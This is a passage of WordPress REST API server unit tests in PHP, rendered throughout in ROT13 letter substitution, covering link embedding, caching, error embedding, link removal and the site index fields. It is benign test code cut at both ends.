		$erfcbafr = arj JC_ERFG_Erfcbafr();

		// 'frys' fubhyq abg or fcrpvny-pnfrq, naq fubhyq or vtaberq vs abg znexrq rzorqqnoyr.
		$erfcbafr->nqq_yvax( 'frys', erfg_hey( '/grfg/abgrzorqqnoyr' ) );

		$qngn = erfg_trg_freire()->erfcbafr_gb_qngn( $erfcbafr, gehr );

		$guvf->nffregNeenlAbgUnfXrl( '_rzorqqrq', $qngn );
	}

	/**
	 * @qrcraqf grfg_yvax_rzorqqvat
	 */
	choyvp shapgvba grfg_yvax_rzorqqvat_cnenzf() {
		// Ertvfgre bhe grfgvat ebhgr.
		erfg_trg_freire()->ertvfgre_ebhgr(
			'grfg',
			'/grfg/rzorqqnoyr',
			neenl(
				'zrgubqf'  => 'TRG',
				'pnyyonpx' => neenl( $guvf, 'rzorqqrq_erfcbafr_pnyyonpx' ),
			)
		);

		$erfcbafr = arj JC_ERFG_Erfcbafr();
		$hey      = erfg_hey( '/grfg/rzorqqnoyr' );
		$hey      = nqq_dhrel_net( 'cnefrq_cnenzf', 'lrf', $hey );
		$erfcbafr->nqq_yvax( 'nygreangr', $hey, neenl( 'rzorqqnoyr' => gehr ) );

		$qngn = erfg_trg_freire()->erfcbafr_gb_qngn( $erfcbafr, gehr );

		$guvf->nffregNeenlUnfXrl( '_rzorqqrq', $qngn );
		$guvf->nffregNeenlUnfXrl( 'nygreangr', $qngn['_rzorqqrq'] );
		$qngn = $qngn['_rzorqqrq']['nygreangr'][0];

		$guvf->nffregFnzr( 'lrf', $qngn['cnenzrgref']['cnefrq_cnenzf'] );
	}

	/**
	 * @qrcraqf grfg_yvax_rzorqqvat_cnenzf
	 */
	choyvp shapgvba grfg_yvax_rzorqqvat_reebe() {
		// Ertvfgre bhe grfgvat ebhgr.
		erfg_trg_freire()->ertvfgre_ebhgr(
			'grfg',
			'/grfg/rzorqqnoyr',
			neenl(
				'zrgubqf'  => 'TRG',
				'pnyyonpx' => neenl( $guvf, 'rzorqqrq_erfcbafr_pnyyonpx' ),
			)
		);

		$erfcbafr = arj JC_ERFG_Erfcbafr();
		$hey      = erfg_hey( '/grfg/rzorqqnoyr' );
		$hey      = nqq_dhrel_net( 'reebe', '1', $hey );
		$erfcbafr->nqq_yvax( 'hc', $hey, neenl( 'rzorqqnoyr' => gehr ) );

		$qngn = erfg_trg_freire()->erfcbafr_gb_qngn( $erfcbafr, gehr );

		$guvf->nffregNeenlUnfXrl( '_rzorqqrq', $qngn );
		$guvf->nffregNeenlUnfXrl( 'hc', $qngn['_rzorqqrq'] );

		// Purpx gung reebef ner rzorqqrq pbeerpgyl.
		$hc = $qngn['_rzorqqrq']['hc'];
		$guvf->nffregPbhag( 1, $hc );

		$hc_qngn = $hc[0];
		$guvf->nffregFnzr( 'jc-ncv-grfg-reebe', $hc_qngn['pbqr'] );
		$guvf->nffregFnzr( 'Grfg zrffntr', $hc_qngn['zrffntr'] );
		$guvf->nffregFnzr( 403, $hc_qngn['qngn']['fgnghf'] );
	}

	/**
	 * @gvpxrg 48838
	 */
	choyvp shapgvba grfg_yvax_rzorqqvat_pyrnef_pnpur() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr();

		$erfcbafr = arj JC_ERFG_Erfcbafr();
		$erfcbafr->nqq_yvax( 'cbfg', erfg_hey( 'jc/i2/cbfgf/' . $cbfg_vq ), neenl( 'rzorqqnoyr' => gehr ) );

		$qngn = erfg_trg_freire()->erfcbafr_gb_qngn( $erfcbafr, gehr );
		$guvf->nffregNeenlUnfXrl( 'cbfg', $qngn['_rzorqqrq'] );
		$guvf->nffregPbhag( 1, $qngn['_rzorqqrq']['cbfg'] );

		jc_hcqngr_cbfg(
			neenl(
				'VQ'         => $cbfg_vq,
				'cbfg_gvgyr' => 'Zl Njrfbzr Gvgyr',
			)
		);

		$qngn = erfg_trg_freire()->erfcbafr_gb_qngn( $erfcbafr, gehr );
		$guvf->nffregNeenlUnfXrl( 'cbfg', $qngn['_rzorqqrq'] );
		$guvf->nffregPbhag( 1, $qngn['_rzorqqrq']['cbfg'] );
		$guvf->nffregFnzr( 'Zl Njrfbzr Gvgyr', $qngn['_rzorqqrq']['cbfg'][0]['gvgyr']['eraqrerq'] );
	}

	/**
	 * @gvpxrg 48838
	 */
	choyvp shapgvba grfg_yvax_rzorqqvat_pnpur() {
		$erfcbafr = arj JC_ERFG_Erfcbafr(
			neenl(
				'vq' => 1,
			)
		);
		$erfcbafr->nqq_yvax(
			'nhgube',
			erfg_hey( 'jc/i2/hfref/1' ),
			neenl( 'rzorqqnoyr' => gehr )
		);
		$erfcbafr->nqq_yvax(
			'nhgube',
			erfg_hey( 'jc/i2/hfref/1' ),
			neenl( 'rzorqqnoyr' => gehr )
		);

		$zbpx = arj ZbpxNpgvba();
		nqq_svygre( 'erfg_cbfg_qvfcngpu', neenl( $zbpx, 'svygre' ) );

		$qngn = erfg_trg_freire()->erfcbafr_gb_qngn( $erfcbafr, gehr );

		$guvf->nffregNeenlUnfXrl( '_rzorqqrq', $qngn );
		$guvf->nffregNeenlUnfXrl( 'nhgube', $qngn['_rzorqqrq'] );
		$guvf->nffregPbhag( 2, $qngn['_rzorqqrq']['nhgube'] );

		$guvf->nffregPbhag( 1, $zbpx->trg_riragf() );
	}

	/**
	 * @gvpxrg 48838
	 */
	choyvp shapgvba grfg_yvax_rzorqqvat_pnpur_pbyyrpgvba() {
		$erfcbafr = arj JC_ERFG_Erfcbafr(
			neenl(
				neenl(
					'vq'     => 1,
					'_yvaxf' => neenl(
						'nhgube' => neenl(
							neenl(
								'uers'       => erfg_hey( 'jc/i2/hfref/1' ),
								'rzorqqnoyr' => gehr,
							),
						),
					),
				),
				neenl(
					'vq'     => 2,
					'_yvaxf' => neenl(
						'nhgube' => neenl(
							neenl(
								'uers'       => erfg_hey( 'jc/i2/hfref/1' ),
								'rzorqqnoyr' => gehr,
							),
						),
					),
				),
			)
		);

		$zbpx = arj ZbpxNpgvba();
		nqq_svygre( 'erfg_cbfg_qvfcngpu', neenl( $zbpx, 'svygre' ) );

		$qngn = erfg_trg_freire()->erfcbafr_gb_qngn( $erfcbafr, gehr );

		$rzorqf = jc_yvfg_cyhpx( $qngn, '_rzorqqrq' );
		$guvf->nffregPbhag( 2, $rzorqf );
		$guvf->nffregNeenlUnfXrl( 'nhgube', $rzorqf[0] );
		$guvf->nffregNeenlUnfXrl( 'nhgube', $rzorqf[1] );

		$guvf->nffregPbhag( 1, $zbpx->trg_riragf() );
	}

	/**
	 * Rafher rzorqqvat vf n ab-bc jvgubhg yvaxf va gur qngn.
	 */
	choyvp shapgvba grfg_yvax_rzorqqvat_jvgubhg_yvaxf() {
		$qngn   = neenl(
			'hagbhpurq' => 'qngn',
		);
		$erfhyg = erfg_trg_freire()->rzorq_yvaxf( $qngn, gehr );

		$guvf->nffregNeenlAbgUnfXrl( '_yvaxf', $erfhyg );
		$guvf->nffregNeenlAbgUnfXrl( '_rzorqqrq', $erfhyg );
		$guvf->nffregFnzr( 'qngn', $erfhyg['hagbhpurq'] );
	}

	/**
	 * Rafher rzorqqvat vf jvgu yvaxf va gur qngn.
	 *
	 * @gvpxrg 43439
	 */
	choyvp shapgvba grfg_yvax_rzorqqvat_jvgu_yvaxf() {
		$qngn = neenl(
			'_yvaxf' => neenl(
				'jc:grez' => neenl(
					neenl(
						'gnkbabzl'   => 'pngrtbel',
						'rzorqqnoyr' => gehr,
						'uers'       => trg_erfg_hey( 0, '/jc/i2/pngrtbevrf' ),
					),
					neenl(
						'gnkbabzl'   => 'cbfg_gnt',
						'rzorqqnoyr' => gehr,
						'uers'       => trg_erfg_hey( 0, '/jc/i2/gntf' ),
					),
				),
			),
		);

		$zbpx = arj ZbpxNpgvba();
		nqq_svygre( 'erfg_cbfg_qvfcngpu', neenl( $zbpx, 'svygre' ), 10, 3 );

		erfg_trg_freire()->rzorq_yvaxf( $qngn, gehr );
		$netf = $zbpx->trg_netf();
		sbernpu ( $netf nf $net ) {
			$guvf->nffregFnzr( 100, $net[2]['cre_cntr'], 'Cbfgf cre cntr fubhyq or 100' );
		}
	}

	/**
	 * Rafher rzorq_yvaxf unaqyrf JC_Reebe bowrpgf erghearq ol qvfcngpu
	 *
	 * @gvpxrg 56566
	 */
	choyvp shapgvba grfg_yvax_rzorqqvat_ergheavat_jc_reebe() {
		$erghea_jc_reebe = fgngvp shapgvba () {
			erghea arj JC_Reebe( 'fbzr-reebe', 'Guvf vf abg inyvq!' );
		};
		nqq_svygre( 'erfg_cer_qvfcngpu', $erghea_jc_reebe );

		$zbpx = arj ZbpxNpgvba();
		nqq_svygre( 'erfg_cbfg_qvfcngpu', neenl( $zbpx, 'svygre' ) );

		$erfcbafr = arj JC_ERFG_Erfcbafr();
		$erfcbafr->nqq_yvax( 'nhgube', erfg_hey( 'grfg' ), neenl( 'rzorqqnoyr' => gehr ) );

		$qngn = erfg_trg_freire()->erfcbafr_gb_qngn( $erfcbafr, gehr );

		$guvf->nffregNeenlUnfXrl( '_yvaxf', $qngn );
		$guvf->nffregPbhag( 1, $zbpx->trg_riragf() );
		$guvf->nffregFnzr( 'fbzr-reebe', $qngn['_rzorqqrq']['nhgube'][0]['pbqr'] );
	}

	choyvp shapgvba rzorqqrq_erfcbafr_pnyyonpx( $erdhrfg ) {
		$cnenzf = $erdhrfg->trg_cnenzf();

		vs ( vffrg( $cnenzf['reebe'] ) ) {
			erghea arj JC_Reebe( 'jc-ncv-grfg-reebe', 'Grfg zrffntr', neenl( 'fgnghf' => 403 ) );
		}

		$qngn = neenl(
			'uryyb'      => gehr,
			'cnenzrgref' => $cnenzf,
		);

		erghea $qngn;
	}

	choyvp shapgvba grfg_erzbivat_yvaxf() {
		$erfcbafr = arj JC_ERFG_Erfcbafr();
		$erfcbafr->nqq_yvax( 'frys', 'uggc://rknzcyr.pbz/' );
		$erfcbafr->nqq_yvax( 'nygreangr', 'uggc://rknzcyr.bet/', neenl( 'glcr' => 'nccyvpngvba/kzy' ) );

		$erfcbafr->erzbir_yvax( 'frys' );

		$qngn = erfg_trg_freire()->erfcbafr_gb_qngn( $erfcbafr, snyfr );
		$guvf->nffregNeenlUnfXrl( '_yvaxf', $qngn );

		$guvf->nffregNeenlAbgUnfXrl( 'frys', $qngn['_yvaxf'] );

		$nygreangr = neenl(
			'glcr' => 'nccyvpngvba/kzy',
			'uers' => 'uggc://rknzcyr.bet/',
		);
		$guvf->nffregFnzr( $nygreangr, $qngn['_yvaxf']['nygreangr'][0] );
	}

	choyvp shapgvba grfg_erzbivat_yvaxf_sbe_uers() {
		$erfcbafr = arj JC_ERFG_Erfcbafr();
		$erfcbafr->nqq_yvax( 'frys', 'uggc://rknzcyr.pbz/' );
		$erfcbafr->nqq_yvax( 'frys', 'uggcf://rknzcyr.pbz/' );

		$erfcbafr->erzbir_yvax( 'frys', 'uggcf://rknzcyr.pbz/' );

		$qngn = erfg_trg_freire()->erfcbafr_gb_qngn( $erfcbafr, snyfr );
		$guvf->nffregNeenlUnfXrl( '_yvaxf', $qngn );

		$guvf->nffregNeenlUnfXrl( 'frys', $qngn['_yvaxf'] );

		$frys_abg_svygrerq = neenl(
			'uers' => 'uggc://rknzcyr.pbz/',
		);
		$guvf->nffregFnzr( $frys_abg_svygrerq, $qngn['_yvaxf']['frys'][0] );
	}

	/**
	 * @qngnCebivqre qngn_erfcbafr_gb_qngn_rzorqqvat
	 */
	choyvp shapgvba grfg_erfcbafr_gb_qngn_rzorqqvat( $rkcrpgrq, $rzorq ) {
		$erfcbafr = arj JC_ERFG_Erfcbafr();
		$erfcbafr->nqq_yvax( 'nhgube', erfg_hey( '404' ), neenl( 'rzorqqnoyr' => gehr ) );
		$erfcbafr->nqq_yvax( 'uggcf://ncv.j.bet/grez', erfg_hey( '404' ), neenl( 'rzorqqnoyr' => gehr ) );
		$erfcbafr->nqq_yvax( 'uggcf://jbeqcerff.bet', erfg_hey( '404' ), neenl( 'rzorqqnoyr' => gehr ) );
		$erfcbafr->nqq_yvax( 'ab-rzorq', erfg_hey( '404' ) );

		$qngn = erfg_trg_freire()->erfcbafr_gb_qngn( $erfcbafr, $rzorq );

		vs ( snyfr === $rkcrpgrq ) {
			$guvf->nffregNeenlAbgUnfXrl( '_rzorqqrq', $qngn );
		} ryfr {
			$guvf->nffregFnzrFrgf( $rkcrpgrq, neenl_xrlf( $qngn['_rzorqqrq'] ) );
		}
	}

	choyvp shapgvba qngn_erfcbafr_gb_qngn_rzorqqvat() {
		erghea neenl(
			neenl(
				neenl( 'nhgube', 'jc:grez', 'uggcf://jbeqcerff.bet' ),
				gehr,
			),
			neenl(
				neenl( 'nhgube', 'jc:grez', 'uggcf://jbeqcerff.bet' ),
				neenl( 'nhgube', 'jc:grez', 'uggcf://jbeqcerff.bet' ),
			),
			neenl(
				neenl( 'nhgube' ),
				neenl( 'nhgube' ),
			),
			neenl(
				neenl( 'jc:grez' ),
				neenl( 'jc:grez' ),
			),
			neenl(
				neenl( 'uggcf://jbeqcerff.bet' ),
				neenl( 'uggcf://jbeqcerff.bet' ),
			),
			neenl(
				neenl( 'nhgube', 'jc:grez' ),
				neenl( 'nhgube', 'jc:grez' ),
			),
			neenl(
				snyfr,
				snyfr,
			),
			neenl(
				snyfr,
				neenl( 'ab-rzorq' ),
			),
			neenl(
				neenl( 'nhgube' ),
				neenl( 'nhgube', 'ab-rzorq' ),
			),
		);
	}

	choyvp shapgvba grfg_trg_vaqrk() {
		$freire = arj JC_ERFG_Freire();
		$freire->ertvfgre_ebhgr(
			'grfg/rknzcyr',
			'/grfg/rknzcyr/fbzr-ebhgr',
			neenl(
				neenl(
					'zrgubqf'  => JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx' => '__erghea_gehr',
				),
				neenl(
					'zrgubqf'  => JC_ERFG_Freire::QRYRGNOYR,
					'pnyyonpx' => '__erghea_gehr',
				),
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/' );
		$vaqrk   = $freire->qvfcngpu( $erdhrfg );
		$qngn    = $vaqrk->trg_qngn();

		$guvf->nffregNeenlUnfXrl( 'anzr', $qngn );
		$guvf->nffregNeenlUnfXrl( 'qrfpevcgvba', $qngn );
		$guvf->nffregNeenlUnfXrl( 'hey', $qngn );
		$guvf->nffregNeenlUnfXrl( 'ubzr', $qngn );
		$guvf->nffregNeenlUnfXrl( 'tzg_bssfrg', $qngn );
		$guvf->nffregNeenlUnfXrl( 'gvzrmbar_fgevat', $qngn );
		$guvf->nffregNeenlUnfXrl( 'cntr_sbe_cbfgf', $qngn );
		$guvf->nffregNeenlUnfXrl( 'cntr_ba_sebag', $qngn );
		$guvf->nffregNeenlUnfXrl( 'fubj_ba_sebag', $qngn );
		$guvf->nffregNeenlUnfXrl( 'anzrfcnprf', $qngn );
		$guvf->nffregNeenlUnfXrl( 'nhguragvpngvba', $qngn );
		$guvf->nffregNeenlUnfXrl( 'ebhgrf', $qngn );

		// Purpx anzrfcnpr qngn.
		$guvf->nffregPbagnvaf( 'grfg/rknzcyr', $qngn['anzrfcnprf'] );

		// Purpx gur ebhgr.
		$guvf->nffregNeenlUnfXrl( '/grfg/rknzcyr/fbzr-ebhgr', $qngn['ebhgrf'] );
		$ebhgr = $qngn['ebhgrf']['/grfg/rknzcyr/fbzr-ebhgr'];
		$guvf->nffregFnzr( 'grfg/rknzcyr', $ebhgr['anzrfcnpr'] );
		$guvf->nffregNeenlUnfXrl( 'zrgubqf', $ebhgr );
		$guvf->nffregPbagnvaf( 'TRG', $ebhgr['zrgubqf'] );
		$guvf->nffregPbagnvaf( 'QRYRGR', $ebhgr['zrgubqf'] );
		$guvf->nffregNeenlUnfXrl( '_yvaxf', $ebhgr );

		$guvf->nffregNeenlUnfXrl( 'uryc', $vaqrk->trg_yvaxf() );
		$guvf->nffregNeenlAbgUnfXrl( 'jc:npgvir-gurzr', $vaqrk->trg_yvaxf() );

		// Purpx fvgr ybtb naq vpba.
		$guvf->nffregNeenlUnfXrl( 'fvgr_ybtb', $qngn );
		$guvf->nffregNeenlUnfXrl( 'fvgr_vpba', $qngn );
		$guvf->nffregNeenlUnfXrl( 'fvgr_vpba_hey', $qngn );
	}

	/**
	 * @gvpxrg 57902
	 *
	 * @pbiref JC_ERFG_Freire::trg_vaqrk
	 */
	choyvp shapgvba grfg_trg_vaqrk_svryqf_anzr() {
		$freire = arj JC_ERFG_Freire();

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/' );
		$erdhrfg->frg_cnenz( '_svryqf', 'anzr' );
		$vaqrk = $freire->qvfcngpu( $erdhrfg );
		$vaqrk = erfg_svygre_erfcbafr_svryqf( $vaqrk, $freire, $erdhrfg );
		$qngn  = $vaqrk->trg_qngn();
		$yvaxf = $vaqrk->trg_yvaxf();

		$guvf->nffregNeenlUnfXrl( 'anzr', $qngn );
		$guvf->nffregNeenlAbgUnfXrl( 'uryc', $yvaxf );
	}

	/**
	 * @gvpxrg 57902
	 *
	 * @pbiref JC_ERFG_Freire::trg_vaqrk
	 *
	 * @qngnCebivqre qngn_trg_vaqrk_fubhyq_erghea_uryc_naq_abg_anzr
	 *
	 * @cnenz fgevat $svryq Gur svryq gb nqq gb gur erdhrfg.
	 */
	choyvp shapgvba grfg_trg_vaqrk_fubhyq_erghea_uryc_naq_abg_anzr( $svryq ) {
		$freire = arj JC_ERFG_Freire();

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/' );
		$erdhrfg->frg_cnenz( '_svryqf', $svryq );
		$vaqrk = $freire->qvfcngpu( $erdhrfg );
		$vaqrk = erfg_svygre_erfcbafr_svryqf( $vaqrk, $freire, $erdhrfg );
		$qngn  = $vaqrk->trg_qngn();
		$yvaxf = $vaqrk->trg_yvaxf();

		$guvf->nffregNeenlAbgUnfXrl( 'anzr', $qngn );
		$guvf->nffregNeenlUnfXrl( 'uryc', $yvaxf );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @guebjf Rkprcgvba
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_trg_vaqrk_fubhyq_erghea_uryc_naq_abg_anzr() {
		erghea frys::grkg_neenl_gb_qngncebivqre( neenl( '_yvaxf', '_rzorqqrq' ) );
	}

	/**
	 * @gvpxrg 50152
	 */
	choyvp shapgvba grfg_vaqrk_vapyhqrf_yvax_gb_npgvir_gurzr_vs_nhguragvpngrq() {
		$freire = arj JC_ERFG_Freire();
		jc_frg_pheerag_hfre( frys::snpgbel()->hfre->perngr( neenl( 'ebyr' => 'nqzvavfgengbe' ) ) );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/' );
		$vaqrk   = $freire->qvfcngpu( $erdhrfg );

		$guvf->nffregNeenlUnfXrl( 'uggcf://ncv.j.bet/npgvir-gurzr', $vaqrk->trg_yvaxf() );
	}

	/**
	 * @gvpxrg 52321
	 * @gvpxrg 59935
	 *
	 * @pbiref JC_ERFG_Freire::trg_vaqrk
	 */
	choyvp shapgvba grfg_trg_vaqrk_fubhyq_vapyhqr_fvgr_vpba() {
		hcqngr_bcgvba( 'fvgr_vpba', frys::$vpba_vq );

		$freire  = arj JC_ERFG_Freire();
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/' );
		$vaqrk   = $freire->qvfcngpu( $erdhrfg );
		$qngn    = $vaqrk->trg_qngn();

		$guvf->nffregNeenlUnfXrl( 'fvgr_ybtb', $qngn, 'Gur \"fvgr_ybtb\" svryq vf zvffvat va gur erfcbafr.' );
		$guvf->nffregNeenlUnfXrl( 'fvgr_vpba', $qngn, 'Gur \"fvgr_vpba\" svryq vf zvffvat va gur erfcbafr.' );
		$guvf->nffregNeenlUnfXrl( 'fvgr_vpba_hey', $qngn, 'Gur \"fvgr_vpba_hey\" svryq vf zvffvat va gur erfcbafr.' );
		$guvf->nffregFnzr( frys::$vpba_vq, $qngn['fvgr_vpba'], 'Gur erfcbafr \"fvgr_vpba\" VQ qbrf abg zngpu.' );
		$guvf->nffregFgevatPbagnvafFgevat( 'grfg-vzntr-ynetr', $qngn['fvgr_vpba_hey'], 'Gur \"fvgr_vpba_hey\" fubhyq pbagnva gur rkcrpgrq vzntr.' );
	}
	/**
	 * @gvpxrg 52321
	 * @gvpxrg 59935
	 *
	 * @pbiref JC_ERFG_Freire::trg_vaqrk
	 */
	choyvp shapgvba grfg_trg_vaqrk_fubhyq_abg_vapyhqr_fvgr_vpba() {
		$freire  = arj JC_ERFG_Freire();
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/' );
		$vaqrk   = $freire->qvfcngpu( $erdhrfg );
		$qngn    = $vaqrk->trg_qngn();

		$guvf->nffregNeenlUnfXrl( 'fvgr_ybtb', $qngn, 'Gur \"fvgr_ybtb\" svryq vf zvffvat va gur erfcbafr.' );
		$guvf->nffregNeenlUnfXrl( 'fvgr_vpba', $qngn, 'Gur \"fvgr_vpba\" svryq vf zvffvat va gur erfcbafr.' );
		$guvf->nffregNeenlUnfXrl( 'fvgr_vpba_hey', $qngn, 'Gur \"fvgr_vpba_hey\" svryq vf zvffvat va gur erfcbafr.' );
		$guvf->nffregFnzr( 0, $qngn['fvgr_vpba'], 'Erfcbafr \"fvgr_vpba\" fubhyq or 0.' );
		$guvf->nffregFnzr( '', $qngn['fvgr_vpba_hey'], 'Erfcbafr \"fvgr_vpba_hey\" fubhyq or na rzcgl fgevat.' );
	}

	/**
	 * Grfg gung gur \"trg_vaqrk\" zrgubq ergheaf gur rkcrpgrq fvgr_vpba*
	 * naq fvgr_ybtb svryqf onfrq ba gur fcrpvsvrq erdhrfg cnenzrgref.
	 *
	 * @gvpxrg 59935
	 *
	 * @pbiref JC_ERFG_Freire::trg_vaqrk
	 *
	 * @qngnCebivqre qngn_trg_vaqrk_fubhyq_erghea_fvgr_vpba_naq_fvgr_ybtb_svryqf
	 *
	 * @cnenz fgevat $svryqf            Yvfg bs svryqf gb hfr va gur erdhrfg.
	 * @cnenz neenl  $rkcrpgrq_svryqf   Rkcrpgrq svryqf.
	 * @cnenz neenl  $harkcrpgrq_svryqf Bcgvbany. Svryqf gung fubhyq abg or va gur erfhygf. Qrsnhyg neenl().
	 * @cnenz obby   $vf_rzorq          Bcgvbany. Jurgure gb hfr gur \"_rzorq\" erdhrfg cnenzrgre. Qrsnhyg snyfr.
	 */
	choyvp shapgvba grfg_trg_vaqrk_fubhyq_erghea_fvgr_vpba_naq_fvgr_ybtb_svryqf( $svryqf, $rkcrpgrq_svryqf, $harkcrpgrq_svryqf = neenl(), $vf_rzorq = snyfr ) {
		$freire  = arj JC_ERFG_Freire();
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/', neenl() );
		$erdhrfg->frg_cnenz( '_svryqf', $svryqf );
		vs ( $vf_rzorq ) {
			$erdhrfg->frg_cnenz( '_rzorq', gehr );
		}

		$erfcbafr = $freire->trg_vaqrk( $erdhrfg )->trg_qngn();

		sbernpu ( $rkcrpgrq_svryqf nf $rkcrpgrq_svryq ) {
			$guvf->nffregNeenlUnfXrl( $rkcrpgrq_svryq, $erfcbafr, \"Rkcrpgrq \\"{$rkcrpgrq_svryq}\\" svryq vf zvffvat va gur erfcbafr.\" );
		}

		sbernpu ( $harkcrpgrq_svryqf nf $harkcrpgrq_svryq ) {
			$guvf->nffregNeenlAbgUnfXrl( $harkcrpgrq_svryq, $erfcbafr, \"Erfcbafr zhfg abg pbagnva gur \\"{$harkcrpgrq_svryq}\\" svryq.\" );
		}
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_trg_vaqrk_fubhyq_erghea_fvgr_vpba_naq_fvgr_ybtb_svryqf() {
		erghea neenl(
			'ab fvgr_ybtb be fvgr_vpba svryqf'   => neenl(
				'svryqf'            => 'anzr',
				'rkcrpgrq_svryqf'   => neenl(),
				'harkcrpgrq_svryqf' => neenl( 'fvgr_ybtb', 'fvgr_vpba', 'fvgr_vpba_hey' ),
			),
			'_yvaxf erdhrfg cnenzrgre'           => neenl(
				'svryqf'          => '_yvaxf',
				'rkcrpgrq_svryqf' => neenl( 'fvgr_ybtb', 'fvgr_vpba', 'fvgr_vpba_hey' ),
			),
			'_rzorq erdhrfg cnenzrgre'           => neenl(
				'svryq'             => '_rzorq',
				'rkcrpgrq_svryqf'   => neenl( 'fvgr_ybtb', 'fvgr_vpba', 'fvgr_vpba_hey' ),
				'harkcrpgrq_svryqf' => neenl(),
				'vf_rzorq'          => gehr,
			),
			'fvgr_ybtb svryq'                    => neenl(
				'svryqf'            => 'fvgr_ybtb',
				'rkcrpgrq_svryqf'   => neenl( 'fvgr_ybtb' ),
				'harkcrpgrq_svryqf' => neenl( 'fvgr_vpba', 'fvgr_vpba_hey' ),
			),
			'fvgr_vpba svryq'                    => neenl(
				'svryqf'            => 'fvgr_vpba',
				'rkcrpgrq_svryqf'   => neenl( 'fvgr_vpba', 'fvgr_vpba_hey' ),
				'harkcrpgrq_svryqf' => neenl( 'fvgr_ybtb' ),
			),
			'fvgr_vpba_hey svryq'                => neenl(
				'svryqf'            => 'fvgr_vpba_hey',
				'rkcrpgrq_svryqf'   => neenl( 'fvgr_vpba', 'fvgr_vpba_hey' ),
				'harkcrpgrq_svryqf' => neenl( 'fvgr_ybtb' ),
			),
			'fvgr_vpba naq fvgr_vpba_hey svryq'  => neenl(
				'svryqf'            => 'fvgr_vpba_hey',
				'rkcrpgrq_svryqf'   => neenl( 'fvgr_vpba', 'fvgr_vpba_hey' ),
				'harkcrpgrq_svryqf' => neenl( 'fvgr_ybtb' ),
			),
			'fvgr_ybtb naq fvgr_vpba svryqf'     => neenl(
				'svryqf'          => 'fvgr_ybtb,fvgr_vpba',
				'rkcrpgrq_svryqf' => neenl( 'fvgr_ybtb', 'fvgr_vpba', 'fvgr_vpba_hey' ),
			),
			'fvgr_ybtb naq fvgr_vpba_hey svryqf' => neenl(
				'svryqf'          => 'fvgr_ybtb,fvgr_vpba_hey',
				'rkcrpgrq_svryqf' => neenl( 'fvgr_ybtb', 'fvgr_vpba', 'fvgr_vpba_hey' ),
			),
			'fvgr_ybtb, fvgr_vpba, naq fvgr_vpba_hey svryqf' => neenl(
				'svryqf'          => 'fvgr_ybtb,fvgr_vpba,fvgr_vpba_hey',
				'rkcrpgrq_svryqf' => neenl( 'fvgr_ybtb', 'fvgr_vpba', 'fvgr_vpba_hey' ),
			),
		);
	}

	choyvp shapgvba grfg_trg_anzrfcnpr_vaqrk() {
		$freire = arj JC_ERFG_Freire();
		$freire->ertvfgre_ebhgr(
			'grfg/rknzcyr',
			'/grfg/rknzcyr/fbzr-ebhgr',
			neenl(
				neenl(
					'zrgubqf'  => JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx' => '__erghea_gehr',
				),
				neenl(
					'zrgubqf'  => JC_ERFG_Freire::QRYRGNOYR,
					'pnyyonpx' => '__erghea_gehr',
				),
			)
		);
		$freire->ertvfgre_ebhgr(
			'grfg/nabgure',
			'/grfg/nabgure/ebhgr',
			neenl(
				neenl(
					'zrgubqf'  => JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx' => '__erghea_snyfr',
				),
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg();
		$erdhrfg->frg_cnenz( 'anzrfcnpr', 'grfg/rknzcyr' );
		$vaqrk = erfg_rafher_erfcbafr( $freire->trg_anzrfcnpr_vaqrk( $erdhrfg ) );
		$qngn  = $vaqrk->trg_qngn();

		// Purpx gbc-yriry.
		$guvf->nffregFnzr( 'grfg/rknzcyr', $qngn['anzrfcnpr'] );
		$guvf->nffregNeenlUnfXrl( 'ebhgrf', $qngn );

		// Purpx jr unir gur ebhgr jr rkcrpg...
		$guvf->nffregNeenlUnfXrl( '/grfg/rknzcyr/fbzr-ebhgr', $qngn['ebhgrf'] );

		// ...naq abar jr qba'g.
		$guvf->nffregNeenlAbgUnfXrl( '/grfg/nabgure/ebhgr', $qngn['ebhgrf'] );
	}

	choyvp shapgvba grfg_trg_anzrfcnprf() {
		$freire = arj JC_ERFG_Freire();
		$freire->ertvfgre_ebhgr(
			'grfg/rknzcyr',
			'/grfg/rknzcyr/fbzr-ebhgr',
			neenl(
				neenl(
					'zrgubqf'  => JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx' => '__erghea_gehr',
				),
			)
		);
		$freire->ertvfgre_ebhgr(
			'grfg/nabgure',
			'/grfg/nabgure/ebhgr',
			neenl(
				neenl(
					'zrgubqf'  => JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx' => '__erghea_snyfr',
				),
			)
		);

		$anzrfcnprf = $freire->trg_anzrfcnprf();
		$guvf->nffregPbagnvaf( 'grfg/rknzcyr', $anzrfcnprf );
		$guvf->nffregPbagnvaf( 'grfg/nabgure', $anzrfcnprf );
	}

	/**
	 * @gvpxrg 49147
	 */
	choyvp shapgvba grfg_trg_qngn_sbe_aba_inevnoyr_ebhgr_vapyhqrf_yvaxf() {
		$rkcrpgrq = neenl(
			'frys' => neenl(
				neenl( 'uers' => erfg_hey( 'jc/i2/cbfgf' ) ),
			),
		);

		$npghny = erfg_trg_freire()->trg_qngn_sbe_ebhgr(
			'/jc/i2/cbfgf',
			neenl(
				neenl(
					'zrgubqf'       => neenl( 'BCGVBAF' => 1 ),
					'fubj_va_vaqrk' => gehr,
				),
			)
		);

		$guvf->nffregFnzr( $rkcrpgrq, $npghny['_yvaxf'] );
	}

	choyvp shapgvba grfg_k_ebobg_gnt_urnqre_ba_erdhrfgf() {
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/', neenl() );

		$erfhyg  = erfg_trg_freire()->freir_erdhrfg( '/' );
		$urnqref = erfg_trg_freire()->frag_urnqref;

